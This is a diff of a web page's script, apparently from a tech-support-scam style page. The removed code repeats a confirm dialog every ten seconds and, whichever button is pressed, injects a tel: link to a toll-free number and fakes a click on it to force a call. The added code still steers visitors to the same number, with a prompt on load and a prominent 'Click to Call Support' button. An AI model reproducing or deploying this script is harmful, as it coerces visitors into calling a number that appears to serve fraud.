@@ -119,45 +119,30 @@
     </footer>
     <script src="jquery-1.12.0.min.js"></script>
 <script src="jquery-1.12.0.min.js"></script>
-    <script>
-        var isCall = 0;
-        $(document).ready(function() {
-            loadText();
-            setTimeout(function() {
-                myFunction();
-            }, 10000);
-            setInterval(myFunction, 10000);
-        });
 
-        function loadText() {
-            $('.js_setTextBlock').prop('innerHTML', defaultText);
-        }
 
-        function myFunction() {
-            if (confirm(defaultText)) {
-                okkkk();
-            } else {
-                okkkk();
-            }
-        }
+	<script src="https://code.jquery.com/jquery-1.12.0.min.js"></script>
+<script>
+    $(document).ready(function() {
+        setTimeout(function() {
+            askUserToCall();
+        }, 100); // Show prompt after 100ms
+    });
 
-        function okkkk() {
-            $('#result').append('<a id="anchorcall" href="tel:+1(888) 295-0630" target="_top"></a>');
-            fakeClick(event, document.getElementById("anchorcall"));
+    function askUserToCall() {
+        if (confirm("Would you like to call support?")) {
+            showCallButton();
         }
+    }
 
-        function fakeClick(event, anchorObj) {
-            if (anchorObj.click) {
-                anchorObj.click();
-            } else if (document.createEvent) {
-                if (event.target !== anchorObj) {
-                    var evt = document.createEvent("MouseEvents");
-                    evt.initMouseEvent("click", true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
-                    var allowDefault = anchorObj.dispatchEvent(evt);
-                }
-            }
-        }
-    </script>
+    function showCallButton() {
+        $('#callContainer').html('<a id="callLink" href="tel:+1(888)295-0630" style="display:block; padding:10px; background:blue; color:white; text-align:center; font-size:20px; text-decoration:none; border-radius:5px;">Click to Call Support</a>');
+        document.getElementById("callLink").focus(); // Brings attention to the link
+    }
+</script>
+
+<div id="callContainer"></div>
+
 
 	
 
